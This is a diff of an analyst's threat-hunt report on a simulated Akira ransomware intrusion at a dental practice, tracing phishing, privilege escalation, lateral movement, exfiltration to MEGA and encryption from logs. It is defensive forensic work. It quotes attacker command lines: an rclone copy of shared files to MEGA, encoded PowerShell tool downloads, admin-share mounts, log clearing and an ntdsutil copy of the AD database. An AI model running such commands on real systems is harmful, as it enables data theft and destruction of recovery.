@@ -2,7 +2,7 @@
 
 # Threat Hunt Report: Hunt 22 "Harborlight" (Akira ransomware at a dental and insurance practice, HL-INC-2026-0204)
 
-A [Cyber Range](https://www.skool.com/cyber-range) live community threat hunt (Hunt 22, "Harborlight"): human-operated ransomware at a dental and insurance practice, traced from one phishing download on a front-office workstation to the file server and the domain controller, from Sysmon, Windows Security, PowerShell and Defender logs with KQL. All 46 flags, finished on time, first to finish. Published after the hunt closed on 13 October 2026; this is version 3 (23 October 2026), rebuilt in my 17-section report format with every finding re-run on the same dataset, eleven detections replayed and exhibits E1–E11. The designed copy is in the repo: [Hunt22-Harborlight-Report.pdf](Hunt22-Harborlight-Report.pdf).
+A [Cyber Range](https://www.skool.com/cyber-range) live community threat hunt (Hunt 22, "Harborlight"): human-operated ransomware at a dental and insurance practice, traced from one phishing download on a front-office workstation to the file server and the domain controller, from Sysmon, Windows Security, PowerShell and Defender logs with KQL. All 46 flags, finished on time, first to finish. Published after the hunt closed on 13 October 2026; this is version 3.1 (23 October 2026): my 17-section format, every finding re-run on the same dataset, eleven detections replayed, exhibits E1–E11. The designed copy is in the repo: [Hunt22-Harborlight-Report.pdf](Hunt22-Harborlight-Report.pdf).
 
 **Analyst:** Ken Kariuki · **Live hunt:** 3 October 2026 · **Result:** 46 of 46 flags, 4,060 / 4,190 points, completed on time (first finisher on the scoreboard at completion)
 
@@ -12,362 +12,304 @@ A [Cyber Range](https://www.skool.com/cyber-range) live community threat hunt (H
 |---|---|
 | Hunt | Cyber Range Hunt 22, "Harborlight" (HL-INC-2026-0204) |
 | Author | Ken Kariuki |
-| Version | v3.0, 2026-10-23 |
-| Result | 46 of 46 flags, 4,060 / 4,190 points, completed on time; first finisher on the scoreboard at completion |
+| Version | v3.1, 2026-10-23 |
+| Result | 46 of 46 flags, 4,060 / 4,190 points, on time; first finisher on the scoreboard |
 | Classification | TLP:CLEAR (simulated range data; the hunt closed on 2026-10-13) |
 | Distribution | Public |
 
 | Version | Date | Change |
 |---|---|---|
 | 1.0 | 2026-10-03 | Written during the live hunt |
-| 2.0 | 2026-10-03 | Confidence labels; seven detection rules tested on the dataset; the change that closes each gap |
-| 3.0 | 2026-10-23 | 17-section structure; every finding re-run on the same dataset; Windows Security, PowerShell and Defender logs added; eleven detections replayed; exhibits E1–E11 |
+| 2.0 | 2026-10-03 | Confidence labels; seven detections tested; a fix for each gap |
+| 3.0 | 2026-10-23 | 17-section format; every finding re-run on the dataset; Security, PowerShell and Defender logs added; eleven detections replayed; exhibits E1–E11 |
+| 3.1 | 2026-10-23 | Rewritten to the point: findings grouped by phase, one claim each, timeline cut to the key moments |
 
-**Clock note.** Every event is on 2026-02-04, and every time in this report is UTC from `EventTime`. `TimeGenerated` is
-ingestion time (every row was ingested on 2026-08-18 between 15:57 and 15:59 UTC), so each query bounds `TimeGenerated`
-wide and orders by `EventTime`. The portal displays Pacific time (PST, UTC-8), so 01:57 UTC shows as 3 Feb 5:57 PM.
+**Clock note.** All events are on 2026-02-04 and every time is UTC from `EventTime`; `TimeGenerated` is ingestion time
+(2026-08-18). The portal shows Pacific time, so 01:57 UTC appears as 3 Feb 5:57 PM.
 
-**Labels.** "(Confidence: High/Medium/Low)" marks inferences only; logged facts cite an exhibit (E#, App C). Passwords
-that appear in the attacker's command lines are masked in every exhibit.
+**Labels.** "(Confidence: …)" marks an inference; a fact cites its exhibit (E#, App C). Passwords in attacker command
+lines are masked.
 
 ## 2. Executive summary
 
-At 01:57:15 UTC Emily Grant, a front-office user, downloaded `Vendor_Invoice_Review.7z` in Edge. She installed 7-Zip to
-open it, and the ISO inside carried `review.dll`, which `rundll32.exe` ran at 01:59:15. A second lure re-ran the same DLL
-at 02:25:06, and one second later the implant was talking to `cdn.cloud-endpoint.net`, a host name behind Cloudflare.
-
-From that one workstation the attacker took the estate in just over three hours. They bypassed UAC, ran as SYSTEM inside
-the Print Spooler, opened LSASS with full access on all three hosts, and used **Emily.Grant's own password** to mount the
-admin shares of the file server (03:34:09) and the domain controller (04:28:22). On the file server they pulled their tools
-from a second host name, `sync.cloud-endpoint.net`, switched Defender off, copied `C:\Shares` to a MEGA account and
-destroyed the backups; on the domain controller they copied the Active Directory database. **Akira** ransomware ran on all
-three hosts between 05:13:05 and 05:17:35, the logs were cleared, and the directory recorded a new account, `svc_sql`,
-added to **Domain Admins** at 05:22:57.
-
-The incident did not end with the ransom notes. Microsoft Defender quarantined the workstation's implant at 09:24:04, the
-only control that acted all day, and nobody followed it to the servers. When someone finally signed in at the file
-server's console at 13:44:55, as its local Administrator, the sign-in started a second copy of the implant under that
-account; the server's three implants were still beaconing when its data ends at 14:47:52. The domain controller was never
-touched and was still beaconing at 18:47:29, the last event in the data. Observed dwell: 16 h 50 min 14 s. The stolen
-share, the AD database copy and the `svc_sql` domain admin all remain with the attacker. Severity: Critical.
+**Bottom line.** One phishing download gave an operator the whole domain in just over three hours. They stole the
+shared files to MEGA, encrypted all three hosts and left a new domain admin behind, and the domain controller was still
+under their control when the data ends. Severity: Critical.
 
 | Hosts encrypted | Data to MEGA | Alerts acted on | New domain admin |
 |---|---|---|---|
 | **3 of 3** (128 notes, 27 files (E6)) | **Sent** (volume not determined (B1)) | **0** (Defender quarantined one implant itself (E10)) | **svc_sql** (Domain Admins at 05:22:57 (E6)) |
 
-**Recommended now.** Isolate the file server and the domain controller; block both `cloud-endpoint.net` host names; disable
-`svc_sql`; reset every domain password and the `krbtgt` password twice; rebuild the domain controller from a backup taken
-before 4 February; and start the breach-notification process for the patient and claims data on `C:\Shares`. Nobody signs
-in to an infected host before it is isolated (F9).
+**What happened**
+
+- **01:57** Emily Grant opens a phishing archive on the front-office PC; the DLL inside runs.
+- **02:42 to 04:28** The attacker reaches SYSTEM on her PC, then her own password opens the file server and the domain controller.
+- **03:57 to 05:22** `C:\Shares` goes to MEGA, the backups are deleted, the AD database is copied, Akira encrypts all three hosts and `svc_sql` joins Domain Admins.
+- **09:24** Defender quarantines the PC's implant: the only control that acted, and nobody saw it.
+- **13:44** The first person at a console signs in to the file server and starts a second copy of the implant; the domain controller is never touched.
+
+**Recommended now.** (1) Isolate the file server and the domain controller. (2) Disable `svc_sql`. (3) Reset every domain
+password, and `krbtgt` twice. (4) Rebuild the domain controller from a backup older than 4 February. (5) Start breach
+notification for the patient and claims data on `C:\Shares`.
 
 ## 3. Overview
 
 | Item | Value |
 |---|---|
-| Hunt type | Live community hunt, flag-guided (46 questions), on a simulated intrusion |
-| Client | Harborlight Dental & Insurance; IT run by Coastal MSP, with no SOC and no alert queue (range brief) |
-| Subject | Emily.Grant, front-office user on BACKOFFICE-PC1 |
-| Hosts | BACKOFFICE-PC1 (172.16.0.109, workstation) · HL-FS01 (172.16.0.8, file server) · ADDC01 (172.16.0.7, domain controller); domain HARBORLIGHT (Harborlight.local), one flat /24 |
-| Period | 2026-02-04 00:00:18 UTC to 2026-02-04 18:47:29 UTC (E9) |
-| Data | `HarborlightDental_CL` in workspace LAW-SilentCorridor, 44,989 rows: Sysmon 27,231, Windows event logs 17,758 (E9), queried from Microsoft Defender Advanced Hunting and the Log Analytics query API |
-| Analyst | Ken Kariuki, lead analyst, with AI tooling (§16); live hunt 2026-10-03, re-analysis 2026-10-23 |
-| Classification; severity | Human-operated ransomware with data theft and domain compromise; Critical (Confidence: High) |
+| Hunt | Live community hunt, 46 questions, simulated intrusion |
+| Client | Harborlight Dental & Insurance; IT by Coastal MSP, with no SOC and no alert queue |
+| Hosts | BACKOFFICE-PC1 (workstation, Emily.Grant) · HL-FS01 (file server) · ADDC01 (domain controller); one flat /24 |
+| Data | `HarborlightDental_CL`, 44,989 rows: Sysmon 27,231 and Windows event logs 17,758 (E9) |
+| Period | 2026-02-04 00:00:18 to 18:47:29 UTC |
+| Analyst | Ken Kariuki, lead analyst, with AI tooling (§16) |
+| Severity | Critical: human-operated ransomware with data theft and domain compromise (Confidence: High) |
 
 ## 4. Hypothesis and ABLE
 
-**Hypothesis.** A phishing download on the front-office workstation gave an operator a foothold, which they widened with
-the user's own credentials to the file server and the domain controller, then used to steal the shared files and encrypt
-all three hosts.
+**Hypothesis.** A phishing download gave an operator a foothold, which Emily's own credentials widened to the file server
+and the domain controller, ending in data theft and encryption.
 
 | ABLE | Content |
 |---|---|
-| Actor | Unknown operator using Akira-branded ransomware; infrastructure `cdn.cloud-endpoint.net` and `sync.cloud-endpoint.net` behind Cloudflare; MEGA account `jwilson.vhr@proton.me` |
-| Behaviour | Archive and ISO lure, DLL through rundll32, UAC bypass, injection into the Print Spooler, LSASS access, admin-share lateral movement, staged tool downloads, rclone to MEGA, anti-recovery, encryption, log clearing, a new domain admin |
+| Actor | Unknown operator; Akira-branded ransomware; `cdn.` and `sync.cloud-endpoint.net` behind Cloudflare; MEGA account `jwilson.vhr@proton.me` |
+| Behaviour | ISO lure, rundll32, UAC bypass, Print Spooler injection, LSASS access, admin shares, rclone, anti-recovery, encryption, log clearing |
 | Location | BACKOFFICE-PC1, HL-FS01, ADDC01 |
-| Evidence | Sysmon 1, 3, 8, 10, 11, 12, 13, 15, 22, 29; Security 4624, 4625, 4720, 4728, 4732, 1102; System 104, 1074; PowerShell 4104; Defender 1116, 1117 |
+| Evidence | Sysmon; Windows Security, System and PowerShell; Defender (E9) |
 
-Counter-hypotheses, judged in §10: H1 insider (Emily); H2 the MSP's own administration; H3 a commodity infection with no
-operator; H4 encryption without data theft.
+Tested against (§10): H1 insider, H2 the MSP's own work, H3 commodity malware with no operator, H4 encryption without theft.
 
 ## 5. Threat intel inputs
 
-The range brief set the scenario, the hosts and the table. Public reporting on Akira, CISA and FBI advisory AA24-109A
-("#StopRansomware: Akira Ransomware", released 2024-04-18, updated 2025-11-13), served for cross-reference: it lists rclone
-to MEGA for exfiltration, abuse of remote tools such as AnyDesk, and vssadmin shadow-copy deletion. No indicator came from
-intel; every indicator in App D comes from the logs. The chain matches that reporting in broad strokes (technique
-similarity, not attribution; Confidence: Low): the ransomware binary was not analysed, and the note name and the `.akira`
-extension are all that tie it to Akira.
+The range brief set the scene. CISA and FBI advisory AA24-109A ("#StopRansomware: Akira Ransomware", updated 2025-11-13)
+lists rclone to MEGA, remote tools such as AnyDesk and vssadmin shadow-copy deletion. The chain matches in broad strokes
+(similarity, not attribution; Confidence: Low); every indicator here comes from the logs.
 
 ## 6. Scope, data sources and blind spots
 
-| Source | Rows (E9) | Shows | Coverage confidence |
-|---|---|---|---|
-| Sysmon (EventID, Computer) | 27,231 | Process, network, file, registry, DNS, process access | High on all three hosts |
-| Windows Security (EventCode, ComputerName) | 15,876 | Sign-ins, account and group changes, log clears | High on the servers; partial on the workstation (B3) |
-| PowerShell Operational | 952 | Script blocks (4104), mostly on the file server | High where it ran |
-| Windows System and Application | 911 | Services, log clears (104), power events (1074) | Medium |
-| Defender Operational | 19 | Detections and configuration changes | Workstation only (B2) |
-| Network, proxy, firewall, DNS server; MSP and AnyDesk logs; MEGA | – | Not available | None |
+| Source | Rows | Coverage |
+|---|---|---|
+| Sysmon | 27,231 | Process, network, file, registry, DNS and process access on all three hosts |
+| Windows Security | 15,876 | Sign-ins, account and group changes, log clears; partial on the workstation (B3) |
+| PowerShell Operational | 952 | Script blocks, mostly on the file server |
+| Windows System and Application | 911 | Services, log clears, power events |
+| Defender Operational | 19 | Workstation only (B2) |
+| Network, proxy, DNS, MSP, AnyDesk, MEGA | – | Not available |
 
-- **B1** No network, proxy, firewall or DNS-server logs: the bytes sent to MEGA and the content of the beacons are not observable.
-- **B2** Defender's own log is collected only from the workstation; the servers' Defender state after 04:03 is inferred from the commands that switched it off (E10).
-- **B3** The workstation's log-clear events (1102, 104) are missing, although `wevtutil cl` ran there 21 times (E5).
-- **B4** Most Sysmon fields sit in `EventData_Xml`; the flattened columns are empty for events 8 and 10.
-- **B5** `TimeGenerated` is ingestion time (clock note); `EventTime` is used throughout.
-- **B6** No memory, disk images or binaries: `review.dll`, `taskhostw.exe` and `updater.exe` are known by path, behaviour and Defender verdict only.
-- **B7** No AnyDesk or MSP-side logs: who used AnyDesk at 10:43 and 13:47 cannot be told.
-- **B8** The data ends at 18:47:29; whether the domain controller's beacon stopped or collection ended is not known.
+- **B1** No network logs: bytes to MEGA and beacon content are unknown.
+- **B2** No Defender log from the servers.
+- **B3** The workstation's own log-clear events never arrived (E5).
+- **B4** No memory, disks or binaries: the malware is known by path and verdict only.
+- **B5** No AnyDesk or MSP logs: who used AnyDesk is unknown.
+- **B6** The data ends at 18:47:29 with the DC still beaconing.
 
 ## 7. Execution
 
-**Method.** The live hunt followed the 46 questions in order; each answer was taken from a query result and checked
-against the raw rows before it was submitted (§16). Version 3 re-ran every finding on 2026-10-23 against the same dataset
-and saved each query with its output as an exhibit: the lures and first execution (E1), the UAC bypass (E2), injection
-and LSASS access (E3), admin shares, WMI and the copy to MEGA (E4), anti-recovery and log clearing (E5), encryption, the
-new domain admin and the last beacons (E6), the consoles after the encryption (E7), the detection replay (E8), the
-dataset itself (E9), what Defender and PowerShell logging saw (E10), and the file server's beacons around the first sign-in (E11). Version 3 also read the three log families v2 had
-not used: Windows Security, PowerShell script blocks and Defender.
+**Method.** The live hunt worked the 46 questions in order, checking each answer against the raw rows before submitting
+it (§16). Version 3 re-ran every finding on 2026-10-23 and saved each query with its output as an exhibit (E1–E11).
 
-**Dead ends.** The 268 Credential Manager reads (5379) are the operating system's own, all day long. `akira_svc` is only
-looked up (`net user akira_svc /domain`), never created: the only account created is `svc_sql` (E6). The genuine
-OneDrive client opening other processes under Emily's profile is routine. The first two `net group "Domain Admins"`
-attempts failed on mangled quoting. The Defender tamper detection at 01:14 is Defender's own (§9.11). Account changes by
-ANONYMOUS LOGON at 00:16:44 (`svc_backup`) and 06:16:44 (`svc_sql`) fall at the same minute and second six hours apart,
-which looks like a periodic background job (Confidence: Medium). The `RuntimeBroker.exe` copies that v2 left unresolved
-are attacker downloads (F4).
+| Ruled out | Why |
+|---|---|
+| 268 Credential Manager reads | The operating system's own, all day |
+| `akira_svc` | Only looked up; never created (E6) |
+| Defender's 01:14 tamper alert | Defender rewriting its own keys, 43 minutes before the lure (E10) |
+| The first two `net group` attempts | Failed on mangled quoting |
+| ANONYMOUS LOGON account changes at 00:16:44 and 06:16:44 | Same second, six hours apart: a periodic job (Confidence: Medium) |
+| The `RuntimeBroker.exe` copies v2 left open | Attacker downloads (F4) |
 
 ## 8. Timeline
 
 | Time (UTC) | Event | Source · evidence |
 |---|---|---|
-| 2026-02-04 00:29:02 UTC | AnyDesk is already running on BACKOFFICE-PC1, 88 minutes before the first lure | Sysmon 10 · E7 |
-| **2026-02-04 01:57:15 UTC** | Edge downloads `Vendor_Invoice_Review.7z` to Emily's Downloads; 7-Zip follows at 01:58:13 | Sysmon 15 · E1 |
-| **2026-02-04 01:59:15 UTC** | `rundll32.exe D:\review.dll,StartW` from the mounted ISO (again at 01:59:32 and 02:00:08) | Sysmon 1 · E1 |
-| 2026-02-04 02:25:06 UTC | Second lure: a loop over drive letters D to J runs `review.dll` from E: | Sysmon 1 · E1 |
-| **2026-02-04 02:25:07 UTC** | First C2: rundll32 resolves `cdn.cloud-endpoint.net` (104.21.30.237, 172.67.174.46) | Sysmon 22, 3 · App A q4 |
-| 2026-02-04 02:32:48 UTC | rundll32 injects into notepad.exe | Sysmon 8 · E3 |
-| **2026-02-04 02:42:39 UTC** | fodhelper reaches High integrity; `taskhostw.exe` starts High at 02:42:40 | Sysmon 1, 13 · E2 |
-| 2026-02-04 02:47:11 UTC | taskhostw.exe injects into spoolsv.exe (SYSTEM); spoolsv opens lsass.exe with 0x1fffff at 02:49:46 | Sysmon 8, 10 · E3 |
-| 2026-02-04 02:56:31 UTC | Through notepad.exe, the implant resolves the domain's hosts, sweeps port 445 and writes `20260203185934_recon.zip` | Sysmon 3, 11, 22 · v2 |
-| **2026-02-04 03:34:09 UTC** | `net use Z: \\172.16.0.8\C$` as Emily.Grant, password in clear; the implant is copied to HL-FS01 | Sysmon 1 · E4 |
-| 2026-02-04 03:41:54 UTC | HL-FS01: Run key `SecurityHealth` and task `WindowsUpdate` (onstart, SYSTEM), both to taskhostw.exe | Sysmon 13, 1 · App D |
-| 2026-02-04 03:42:36 UTC | HL-FS01: first log wipe; the server logs its own clear events | Sysmon 1; Security 1102; System 104 · E5 |
-| 2026-02-04 03:44:57 UTC | HL-FS01: `powershell -enc` downloads tools from `sync.cloud-endpoint.net` (five files to 03:53:43) | PowerShell 4104 · E10 |
-| **2026-02-04 03:57:40 UTC** | HL-FS01: renamed rclone copies `C:\Shares` to `mega:HARBORLIGHT-exfil` (again at 03:58:33 and 04:00:14) | Sysmon 1, 22 · E4 |
-| 2026-02-04 04:03:50 UTC | HL-FS01: five Defender protections switched off (again at 04:05:13) | PowerShell 4104 · E10 |
-| 2026-02-04 04:04:05 UTC | HL-FS01: shadow copies, boot recovery and the backup catalog deleted (again at 04:05:12–04:05:26) | Sysmon 1 · E5 |
-| **2026-02-04 04:28:22 UTC** | `net use Y: \\172.16.0.7\C$` from HL-FS01 with the same account | Sysmon 1 · E4 |
-| **2026-02-04 04:33:55 UTC** | ADDC01: `ntdsutil` IFM copies the AD database to `C:\Windows\Temp\ntds` (again at 04:35:35) | Sysmon 1 · E5 |
-| 2026-02-04 04:42:28 UTC | ADDC01: WMI `process call create` deletes shadow copies | Sysmon 1 · E4 |
-| **2026-02-04 05:13:05 UTC** | Akira `updater.exe` runs: HL-FS01 05:13:05, ADDC01 05:14:15, BACKOFFICE-PC1 05:17:35 | Sysmon 11 · E6 |
-| 2026-02-04 05:18:21 UTC | Sixteen log channels cleared per host, to 05:20:01 | Sysmon 1; Security 1102 · E5 |
-| **2026-02-04 05:22:57 UTC** | `svc_sql` (created 05:21:56, added to Administrators 05:22:28) added to Domain Admins | Security 4720, 4732, 4728 · E6 |
-| 2026-02-04 09:24:04 UTC | Defender quarantines the workstation's taskhostw.exe (Trojan:Win32/SuspGolang.AG); that host's last beacon was 09:23:49 | Defender 1116, 1117 · E10, E6 |
-| 2026-02-04 10:43:40 UTC | AnyDesk on the workstation resolves its relay hosts (who connected is not logged) | Sysmon 22 · E7 |
-| **2026-02-04 13:44:55 UTC** | HL-FS01 console sign-in as the local Administrator after three failures; Explorer starts a second copy of the implant at 13:45:16 | Security 4625, 4624; Sysmon 1 · E7, E11 |
-| 2026-02-04 13:49:31 UTC | Workstation console sign-in as the local helpdesk account, which opens AnyDesk and reads its connection log | Security 4624; Sysmon 1 · E7 |
-| 2026-02-04 14:27:48 UTC | The workstation is powered off | System 1074 · E7 |
-| 2026-02-04 14:47:52 UTC | HL-FS01's data ends with all three implants still beaconing | Sysmon 3 · E6, E11 |
-| **2026-02-04 18:47:29 UTC** | ADDC01's last beacon, and the last event in the data | Sysmon 3 · E6, E9 |
+| 2026-02-04 00:29:02 UTC | AnyDesk already running on the workstation | Sysmon · E7 |
+| **2026-02-04 01:57:15 UTC** | Emily downloads the first lure | Sysmon · E1 |
+| **2026-02-04 01:59:15 UTC** | `review.dll` runs from the mounted ISO | Sysmon · E1 |
+| 2026-02-04 02:25:07 UTC | First beacon to `cdn.cloud-endpoint.net` | Sysmon · App A q4 |
+| **2026-02-04 02:42:39 UTC** | UAC bypass reaches High integrity | Sysmon · E2 |
+| 2026-02-04 02:47:11 UTC | Implant moves into the Print Spooler (SYSTEM) | Sysmon · E3 |
+| **2026-02-04 03:34:09 UTC** | Emily's password mounts the file server's `C$` | Sysmon · E4 |
+| 2026-02-04 03:44:57 UTC | Tools downloaded from `sync.cloud-endpoint.net` | PowerShell · E10 |
+| **2026-02-04 03:57:40 UTC** | `C:\Shares` copied to MEGA | Sysmon · E4 |
+| 2026-02-04 04:03:50 UTC | Defender switched off on the file server | PowerShell · E10 |
+| 2026-02-04 04:04:05 UTC | Backups and shadow copies deleted | Sysmon · E5 |
+| **2026-02-04 04:28:22 UTC** | Same password mounts the domain controller's `C$` | Sysmon · E4 |
+| 2026-02-04 04:33:55 UTC | AD database copied with ntdsutil | Sysmon · E5 |
+| **2026-02-04 05:13:05 UTC** | Akira runs: file server, DC 05:14, workstation 05:17 | Sysmon · E6 |
+| **2026-02-04 05:22:57 UTC** | `svc_sql` added to Domain Admins | Security · E6 |
+| 2026-02-04 09:24:04 UTC | Defender quarantines the workstation's implant | Defender · E10 |
+| **2026-02-04 13:44:55 UTC** | Console sign-in on the file server starts a second implant | Security, Sysmon · E7, E11 |
+| 2026-02-04 14:27:48 UTC | Workstation powered off | System · E7 |
+| **2026-02-04 18:47:29 UTC** | DC's last beacon; the data ends | Sysmon · E6 |
 
 ## 9. Findings
 
-**F1 One user, two lures, one DLL.** *State:* Edge wrote both archives to Emily's Downloads, 7-Zip extracted each ISO, and
-`rundll32.exe` ran `review.dll,StartW` from D: three times, then from E: through a drive-letter loop; the first C2 lookup
-follows that run by one second. *Show:* E1; App A q1. *Interpret:* the archive-in-ISO packaging is a common way to keep
-the browser's download mark off the files inside (Confidence: Medium; the mark is not logged), and the second lure was a
-relaunch, not new malware (Confidence: High).
+### Foothold
 
-**F2 Elevation, then SYSTEM through the Print Spooler.** *State:* the implant pointed the per-user `ms-settings` handler
-at `C:\Users\Public\taskhostw.exe`; the first fodhelper stayed Medium, the launch through cmd produced a High fodhelper
-and a High taskhostw.exe one second later; taskhostw.exe then injected into spoolsv.exe on every host it reached. *Show:*
-E2, E3. *Interpret:* from 02:47 onwards the commands on each host come from the Print Spooler, as SYSTEM (Confidence:
-High).
+**F1 Two lures, one DLL.** *State:* Emily opened two archives; each held an ISO whose `review.dll` ran through rundll32,
+and the first beacon followed the second run by one second. *Show:* E1. *Interpret:* the ISO likely shed the browser's
+download mark (Confidence: Medium; not logged).
 
-**F3 Her own password opened both servers.** *State:* `lsass.exe` was opened with PROCESS_ALL_ACCESS by spoolsv.exe on the
-workstation and by taskhostw.exe on all three hosts; Emily.Grant's password was typed in clear on `net use` to the file
-server's `C$` (03:34:09) and the domain controller's (04:28:22), and on a WMI command (04:42:28). *Show:* E3, E4.
-*Interpret:* the attacker knew her password (Confidence: High); that it came from LSASS memory is likely but not proven,
-since no dump file is logged (Confidence: Medium).
+**F2 SYSTEM within an hour.** *State:* a fodhelper UAC bypass reached High integrity at 02:42:39; injection into the Print
+Spooler gave SYSTEM at 02:47:11. *Show:* E2, E3. *Interpret:* every later command runs as SYSTEM (Confidence: High).
 
-**F4 The tools came from a second host name.** *State:* on the file server, taskhostw.exe launched `powershell -enc` six
-times between 03:44:56 and 03:53:43, and script-block logging shows five downloads from `https://sync.cloud-endpoint.net/`:
-`RuntimeBroker.exe`, a fake `MsMpEng.exe` placed inside `C:\ProgramData\Microsoft\Windows Defender\`, `config.dat`,
-`update.bat` and `rclone.conf`. *Show:* E10; App A q6. *Interpret:* the operator staged the toolkit per host on demand,
-and v2's `RuntimeBroker.exe` copies are part of it (Confidence: High).
+### Spread
 
-**F5 `C:\Shares` went to MEGA.** *State:* rclone, renamed `MsMpEng.exe` in `C:\ProgramData\Microsoft`, ran
-`copy C:\Shares mega:HARBORLIGHT-exfil` three times between 03:57:40 and 04:00:14 and resolved MEGA storage nodes 39
-times, to 04:03:39. *Show:* E4. *Interpret:* the upload ran and reached MEGA (Confidence: High); the volume is not
-determined (B1).
+**F3 Her own password opened both servers.** *State:* LSASS was opened with full access on all three hosts; Emily's
+password was typed in clear to mount `C$` on the file server (03:34) and the domain controller (04:28). *Show:* E3, E4.
+*Interpret:* the attacker knew it (Confidence: High), most likely from LSASS (Confidence: Medium).
 
-**F6 Recovery destroyed, the AD database copied, the logs cleared.** *State:* the file server lost its shadow copies, boot
-recovery and backup catalog, each twice, 81 seconds apart; the domain controller's AD database was copied with `ntdsutil`
-IFM and its shadow copies deleted; `wevtutil cl` ran on all three hosts, and the servers logged their own clears (1102,
-104). *Show:* E5. *Interpret:* every domain credential must be treated as exposed (Confidence: High that the copy exists
-on the host; its transfer is not logged).
+**F4 The tools came from a second host name.** *State:* six encoded PowerShell downloads on the file server pulled the
+toolkit from `sync.cloud-endpoint.net`, including a fake `MsMpEng.exe` inside the Defender folder. *Show:* E10.
+*Interpret:* the operator staged tools per host, on demand (Confidence: High).
 
-**F7 Encryption, and a domain admin the directory confirms.** *State:* `updater.exe` wrote 128 ransom notes and renamed 27
-distinct files to `.akira` across the three hosts; the domain controller logged `svc_sql` created (4720), added to
-Administrators (4732) and to Domain Admins (4728) at 05:22:57. `svc_sql` never signs in anywhere in the data. *Show:* E6.
-*Interpret:* `svc_sql` is a standing backdoor into the domain, not yet used (Confidence: High; v2 rated this Medium
-before the directory's own events were read).
+### Theft and destruction
 
-**F8 Defender acted once, on the workstation only.** *State:* at 09:23:31 Defender on the workstation detected the implant
-as Trojan:Win32/SuspGolang.AG and quarantined taskhostw.exe at 09:24:04; that host's beacon stops at 09:23:49. On the file
-server the same implant had switched five Defender protections off at 04:03. *Show:* E10, E6. *Interpret:* the only
-control that worked all day was never seen by a person, so no response reached the two servers for another 4 h 20 min
-(Confidence: High).
+**F5 `C:\Shares` went to MEGA.** *State:* a renamed rclone ran three copies to `mega:HARBORLIGHT-exfil` and resolved MEGA
+storage 39 times. *Show:* E4. *Interpret:* the upload reached MEGA (Confidence: High); its size is unknown (B1).
 
-**F9 The first response ran the backdoor again, as Administrator.** *State:* at 13:44:55, after three failures, someone
-signed in at the file server's console as its local Administrator; within 22 seconds three ransom notes opened and
-`C:\Users\Public\taskhostw.exe` started under that account, launched by Explorer. The implants already running never
-stopped: after the launch taskhostw.exe's beacons roughly double, to 192 in the 47 minutes of the 14:00 hour against 94
-and 96 for the other two implants, and the server's data ends at 14:47:52 with all three still beaconing. At 13:49:31 the
-workstation's local helpdesk account signed in, opened AnyDesk and read AnyDesk's `connection_trace.txt` twice; the
-workstation was powered off at 14:27:48. Nothing touched the domain controller. *Show:* E7, E11, E6. *Interpret:* the
-sign-in fired the Run-key persistence set at 03:41:54 (Confidence: Medium; a manual launch would look the same) and gave
-the attacker a copy running with the Administrator's token; the domain controller, the most valuable host, was still
-under attacker control when the data ends (Confidence: High).
+**F6 Recovery and the directory, gone.** *State:* the file server lost shadow copies, boot recovery and its backup catalog,
+twice; the domain controller's AD database was copied; logs were cleared on all three hosts. *Show:* E5. *Interpret:*
+treat every domain credential as stolen (Confidence: High).
 
-**F10 AnyDesk was already there.** *State:* AnyDesk.exe was running from 00:29:02, before the first lure; the implant's
-processes opened it between 02:47 and 03:31; it resolved AnyDesk relays at 10:43 and 13:47, and the helpdesk account used
-it at 13:50. *Show:* E7. *Interpret:* most likely the MSP's own remote-support tool (Confidence: Medium); whether the
-attacker used it is not determined (B7).
+**F7 Encryption, and a backdoor admin.** *State:* 128 ransom notes and 27 encrypted files; the directory's own events show
+`svc_sql` created and added to Domain Admins at 05:22:57, and it never signs in. *Show:* E6. *Interpret:* a standing
+backdoor (Confidence: High; v2 said Medium).
 
-**9.11 Negative findings**
+### Response
 
-| Looked for | Where | Method | Result |
-|---|---|---|---|
-| Attacker activity before the first lure | BACKOFFICE-PC1, 00:55 to 01:57 | Process creation | None: updaters, a service host and Emily starting Edge at 01:53:40 |
-| Defender's 01:14 tamper detection as part of the attack | BACKOFFICE-PC1 | E10; registry events | Defender's own process and services.exe rewrote its service keys at 01:13:59; judged Defender's own (Confidence: Medium) |
-| Other accounts created | Security 4720, all hosts | E6 | Only `svc_sql`; `akira_svc` is only looked up |
-| Other privileged-group changes | Security 4728, 4732, 4756 | E8 R11 | Only the two `svc_sql` additions |
-| `svc_sql` used | Security, all hosts | Sign-ins and Kerberos events naming it | None after its creation |
-| Attacker services | Security 4697; System 7045 | Service installs | Only Windows' per-user services, created by the 13:44 and 13:49 sign-ins |
-| A beacon from the workstation after the quarantine | Sysmon 3 | E6 | None after 09:23:49 |
-| The AD database copy leaving the DC | Sysmon 3, 11 | Network and file events | None logged (B1) |
+**F8 One alert, and nobody watching.** *State:* Defender quarantined the workstation's implant at 09:24:04 and that host
+went quiet; on the file server Defender had been switched off at 04:03. *Show:* E10, E6. *Interpret:* the alert reached
+no one, so the servers ran for another 4 h 20 min (Confidence: High).
+
+**F9 The first sign-in ran the backdoor again.** *State:* at 13:44:55 the file server's local Administrator signed in at
+the console; 21 s later Explorer started the implant, and its beacons doubled. The workstation's helpdesk account signed
+in at 13:49 and read AnyDesk's log; the PC was powered off at 14:27. The DC was never touched. *Show:* E7, E11.
+*Interpret:* the Run key fired under a privileged account (Confidence: Medium); the DC stayed compromised (Confidence: High).
+
+**F10 AnyDesk was already there.** *State:* AnyDesk ran from 00:29, before the first lure, and looked up its relays at
+10:43 and 13:47. *Show:* E7. *Interpret:* most likely the MSP's tool (Confidence: Medium); attacker use is not shown (B5).
+
+### Negative findings
+
+| Looked for | Result |
+|---|---|
+| Attacker activity before the first lure | None |
+| Other accounts created | Only `svc_sql` |
+| Other privileged-group changes | Only the two `svc_sql` additions (E8 R11) |
+| `svc_sql` signing in | Never |
+| Attacker services | None; only Windows' per-user services at the 13:44 and 13:49 sign-ins |
+| A workstation beacon after the quarantine | None after 09:23:49 |
+| The AD database copy leaving the DC | None logged (B1) |
 
 ## 10. Hypothesis outcome
 
-**Confirmed** on logged facts: the lures and first execution (E1), the admin-share movement with Emily's password (E4),
-the copy to MEGA (E4), the AD database copy (E5), encryption on all three hosts and the new domain admin (E6). **Not
-determined:** how much data reached MEGA (B1), whether the AD database copy left the host (B1), and who was at the
-consoles after the encryption (B7).
+**Confirmed:** phishing foothold, credential reuse to both servers, theft to MEGA, AD database copy and encryption of all
+three hosts (E1–E6). **Not determined:** how much reached MEGA, whether the AD copy left the DC, and who was at the
+consoles (B1, B5).
 
-| Counter-hypothesis | Verdict and evidence |
+| Counter-hypothesis | Verdict |
 |---|---|
